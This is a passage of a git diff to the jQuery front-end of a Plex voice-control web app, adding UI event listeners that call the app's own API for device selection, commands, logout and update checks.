+					var nh = $('.noHeight');
+					nh.slideDown();
+					nh.removeClass('noHeight');
+				},700);
 
+				$('.lazy').Lazy();
 
+				str = "#" + timeStamp;
 			} catch (e) {
 				console.error(e, e.stack);
 			}
@@ -932,7 +583,8 @@ function updateCommands(data, prepend) {
 				$.get('api.php?apiToken=' + apiToken + '&card=' + stamp, function (data) {
 					lastUpdate = data;
 				});
-			})
+			});
+
 			Swiped.init({
 				query: '.resultDiv',
 				left: 1000,
@@ -940,8 +592,7 @@ function updateCommands(data, prepend) {
 					$('#CARDCLOSE' + i).click();
 				}
 			});
-		})
-
+		});
 	}
 }
 
@@ -1062,10 +713,7 @@ setInterval(function () {
 }, 50);
 
 function recurseJSON(json) {
-
 	return '<pre class="prettyprint">' + JSON.stringify(json, undefined, 2) + '</pre>';
-
-
 }
 
 function buildCards(value, i) {
@@ -1319,52 +967,327 @@ function imgError(image) {
 	return true;
 }
 
-function createStaticDevice(id, name, uri, product, broadcast) {
-	var nameString = 'static_' + id + '_Name';
-	var ipString = 'static_' + id + '_URI';
-	var productString = 'static_' + id + '_Product';
-	var device = {
-		'name': name,
-		'URI': uri,
-		'product': product,
-		'broadcast': broadcast
-	};
-
-
-	devices.push({id: device});
-	device['id'] = id;
-	var dataString = "<div class='card' id='dev_" + id + "'>" +
-		'<button id="' + id + '" class="deviceDelete"><span class="material-icons">close</span></button>' +
-		"<div class='card-header'>" +
-		'<label for="static_' + id + '_[Name]" class="appLabel">Device Name:' +
-		"<input type='text' id='static_" + id + "_[name]' value='" + name + "' class='appInput form-control'/>" +
-		'</label>' +
-		'<label for="static_' + id + '_[Uri]" class="appLabel">URI:' +
-		"<input type='text' id='static_" + id + "_[uri]' value='" + uri + "' class='appInput form-control'/>" +
-		'</label>' +
-		'<label for="static_' + id + '_[product]" class="appLabel">Type:' +
-		"<select id='static_" + id + "_[product]' class='appInput form-control'>" +
-		'<option value="cast"' + (product === 'cast' ? 'selected' : '') + '>Cast</option>' +
-		'<option value="direct"' + (product === 'direct' ? 'selected' : '') + '>Direct</option>' +
-		'<option value="indirect"' + (product === 'indirect' ? 'selected' : '') + '>Indirect</option>' +
-		"</select>" +
-		'</label>' +
-		'<div class="togglebutton">' +
-		'<label for="static_' + id + '_[broadcast]" class="appLabel checkLabel">Broadcast' +
-		'<input id="static_' + id + '_[broadcast]" class="appInput" type="checkbox" ' + (broadcast ? 'checked' : '') + '/>' +
-		'</label>' +
-		'</div>' +
-		"</div>" +
-		"</div>";
-	return [dataString, device];
-}
-
-function deleteStaticDevice(id) {
-
-}
-
 function setListeners() {
 	var id;
+
+	// Set up other listeners - shouldn't be rendering stuff here
+
+	// progressSlider.noUiSlider.on('end', function (values, handle) {
+	// 	var value = values[handle];
+	// 	apiToken = $('#apiTokenData').data('token');
+	// 	var newOffset = Math.round((resultDuration * (value * .01)));
+	// 	var url = 'api.php?control&command=seek&value=' + newOffset + "&apiToken=" + apiToken;
+	// 	$.get(url);
+	// });
+	//
+	// volumeSlider.noUiSlider.on('end', function (values, handle) {
+	// 	var value = values[handle];
+	// 	apiToken = $('#apiTokenData').data('token');
+	// 	var url = 'api.php?control&command=volume&value=' + value + "&apiToken=" + apiToken;
+	// 	$.get(url);
+	// });
+
+
+	$('#alertModal').on('hidden.bs.modal', function () {
+		loopMessages();
+	});
+
+
+	$('#logLevel').change(function () {
+		logLevel = $(this).val();
+		console.log("Log level changed to " + logLevel);
+	});
+
+	var checkbox = $(':checkbox');
+	checkbox.change(function () {
+		var label = $("label[for='" + $(this).attr('id') + "']");
+		var checked = ($(this).is(':checked'));
+		if (checked) {
+			label.css("color", "#003792");
+		} else {
+			label.css("color", "#A1A1A1");
+		}
+		if ($(this).hasClass('appToggle')) {
+			var appName = $(this).data('app');
+			var group = $('#'+appName+'Group');
+			if (checked) {
+				group.show();
+			} else {
+				group.hide();
+			}
+
+		}
+	});
+
+	checkbox.each(function () {
+		var label = $("label[for='" + $(this).attr('id') + "']");
+		if ($(this).is(':checked')) {
+			label.css("color", "#003792");
+		} else {
+			label.css("color", "#A1A1A1");
+		}
+	});
+
+	$('#logout').click(function () {
+		var bgs = $('.bg');
+		$('#results').css({"top": "-2000px", "max-height": 0, "overflow": "hidden"});
+		$.snackbar({content: "Logging out."});
+		sessionStorage.clear();
+		localStorage.clear();
+		window.caches.delete('phlex');
+		caches.delete('phlex');
+
+		setcookie('PHPSESSID', '', time() - 86400, '/folder/');
+		setTimeout(
+			function () {
+				$('#mainwrap').css({"top": "-200px"});
+				bgs.fadeOut(1000);
+				$('.castArt').fadeOut(1000);
+			}, 500);
+
+
+	});
+
+	$(".btn").on('click', function () {
+		var value, regUrl;
+		var serverAddress = $('#publicAddress').val();
+		if ($(this).hasClass("copyInput")) {
+			value = $(this).val();
+			clipboard.copy(value);
+			$.snackbar({content: "Successfully copied URL."});
+		}
+
+		if ($(this).hasClass("testInput")) {
+			value = $(this).attr('value');
+			apiToken = $('#apiTokenData').data('token');
+
+			$.get('api.php?test=' + value + '&apiToken=' + apiToken, function (data) {
+				var dataArray = [data];
+				$.snackbar({content: JSON.stringify(dataArray[0].status).replace(/"/g, "")});
+			});
+		}
+		if ($(this).hasClass("resetInput")) {
+			appName = $(this).data('value');
+			if (confirm('Are you sure you want to clear settings for ' + appName + '?')) {
+
+			}
+		}
+
+		if ($(this).hasClass("hookLnk")) {
+			appName = $(this).data('value');
+			var string = serverAddress + "/api.php?apiToken=" + apiToken + "&notify=true";
+			clipboard.copy(string);
+		}
+
+		if ($(this).hasClass("setupInput")) {
+			appName = $(this).data('value');
+			apiToken = $('#apiTokenData').data('token');
+
+			$.get('api.php?setup&apiToken=' + apiToken, function (data) {
+				$.snackbar({content: JSON.stringify(data).replace(/"/g, "")});
+			});
+			$.snackbar({content: "Setting up API.ai Bot."});
+		}
+
+		if ($(this).hasClass("linkBtn")) {
+			regUrl = false;
+			action = $(this).data('action');
+			if (action === 'google') regUrl = 'https://phlexserver.cookiehigh.us/api.php?apiToken=' + apiToken + "&serverAddress=" + serverAddress;
+			if (action === 'amazon') regUrl = 'https://phlexchat.com/alexaAuth.php?apiToken=' + apiToken + "&serverAddress=" + serverAddress;
+			if (regUrl) {
+				newwindow = window.open(regUrl, '');
+				if (window.focus) {
+					newwindow.focus();
+				}
+			} else {
+				if (action === 'test') {
+					apiToken = $('#apiTokenData').data('token');
+
+					regUrl = 'https://phlexserver.cookiehigh.us/api.php?apiToken=' + apiToken + "&serverAddress=" + serverAddress + "&test=true";
+					$.get(regUrl, function (data) {
+						console.log("Data: " + data);
+						$.snackbar({content: data});
+					});
+				}
+			}
+		}
+	});
+
+
+	$(document).on('click', '.client-item', function () {
+		var clientId = $(this).data('id');
+		if ($(this).data('id') !== "rescan") {
+			$('.ddLabel').html($(this).text());
+			$(this).siblings().removeClass('dd-selected');
+			$(this).addClass('dd-selected');
+		} else {
+			console.log("Rescanning devices.");
+		}
+		updateDevice('Client', clientId, apiToken);
+	});
+
+	$("#serverList").change(function () {
+		var serverID = $(this).val();
+		var element = $(this).find('option:selected');
+		var type = element.data('type');
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?apiToken=' + apiToken, {
+			device: 'Server',
+			id: serverID
+		});
+	});
+
+	$("#parentList").change(function () {
+		var serverID = $(this).val();
+		var element = $(this).find('option:selected');
+		var type = element.data('type');
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?apiToken=' + apiToken, {
+			device: 'Parent',
+			id: serverID
+		});
+	});
+
+	$("#dvrList").change(function () {
+		var serverID = $(this).val();
+		var element = $(this).find('option:selected');
+		var type = element.data('type');
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?apiToken=' + apiToken, {
+			device: 'Dvr',
+			id: serverID
+		});
+	});
+
+	$(".profileList").change(function () {
+		var service = $(this).attr('id');
+		var index = $(this).find('option:selected').data('index');
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?apiToken=' + apiToken, {id: service, value: index});
+	});
+
+	$("#appLanguage").change(function () {
+		var lang = $(this).find('option:selected').data('value');
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?apiToken=' + apiToken, {id: "appLanguage", value: lang});
+		$.snackbar({content: "Language changed, reloading page."});
+		setTimeout(function () {
+			location.reload();
+		}, 1000);
+	});
+
+	// This handles sending and parsing our result for the web UI.
+	$("#executeButton").click(function () {
+		console.log("Execute clicked!");
+		$('.load-bar').show();
+		var command = $('#commandTest').val();
+		if (command !== '') {
+			command = command.replace(/ /g, "+");
+			var url = 'api.php?say&command=' + command + '&apiToken=' + apiToken;
+			apiToken = $('#apiTokenData').data('token');
+			$.get(url, function () {
+				$('.load-bar').hide();
+			});
+		}
+	});
+
+
+	client.click(function () {
+		console.log("CLICKED CLIENT!");
+		var pos = client.position();
+		var width = client.outerWidth();
+
+		//show the menu directly over the placeholder
+		$("#plexClient").css({
+			position: "absolute",
+			top: pos.bottom + "px",
+			left: (pos.left - width) + "px"
+		});
+	});
+
+
+	$(".expandWrap").click(function () {
+		$(this).children('.expand').slideToggle();
+	});
+
+	$("#sendLog").on('click', function () {
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?sendlog&apiToken=' + apiToken);
+	});
+
+
+	$('#commandTest').keypress(function (event) {
+		if (event.keyCode === 13) {
+			$('#executeButton').click();
+		}
+	});
+	$('#plexServerEnabled').change(function () {
+		$('#plexGroup').toggle();
+	});
+
+	$('#apiEnabled').change(function () {
+		$('.apiGroup').toggle();
+	});
+
+
+	$('#resolution').change(function () {
+		apiToken = $('#apiTokenData').data('token');
+
+		var res = $(this).find('option:selected').data('value');
+		$.get('api.php?apiToken=' + apiToken, {id: 'plexDvrResolution', value: res});
+	});
+
+	$('#checkUpdates').click(function () {
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?apiToken=' + apiToken, {checkUpdates: true}, function (data) {
+			$('#updateContainer').html(data);
+		});
+	});
+
+	$('#installUpdates').click(function () {
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?apiToken=' + apiToken, {installUpdates: true}, function (data) {
+			$('#updateContainer').html(data);
+		});
+	});
+
+	document.addEventListener('DOMContentLoaded', function () {
+		if (!Notification) {
+			alert('Desktop notifications not available in your browser. Try Chromium.');
+			return;
+		}
+
+		if (Notification.permission !== "granted")
+			Notification.requestPermission();
+	});
+
+	// Update our status every 10 seconds?  Should this be longer?  Shorter?  IDK...
+
+	$('.controlBtn').click(function () {
+		var myId = $(this).attr("id");
+		myId = myId.replace("Btn", "");
+		console.log("Firing " + myId + " command.");
+		if (myId === "play") {
+			$('#playBtn').hide();
+			$('#pauseBtn').show();
+		}
+		if (myId === "pause") {
+			$('#playBtn').show();
+			$('#pauseBtn').hide();
+		}
+		apiToken = $('#apiTokenData').data('token');
+
+		$.get('api.php?say&noLog=true&command=' + myId + "&apiToken=" + apiToken);
+	});
+
 	$(document).on('click', '.deviceDelete', function () {
 		id = $(this).attr('id');
 		console.log("Gonna delete static device " + id);
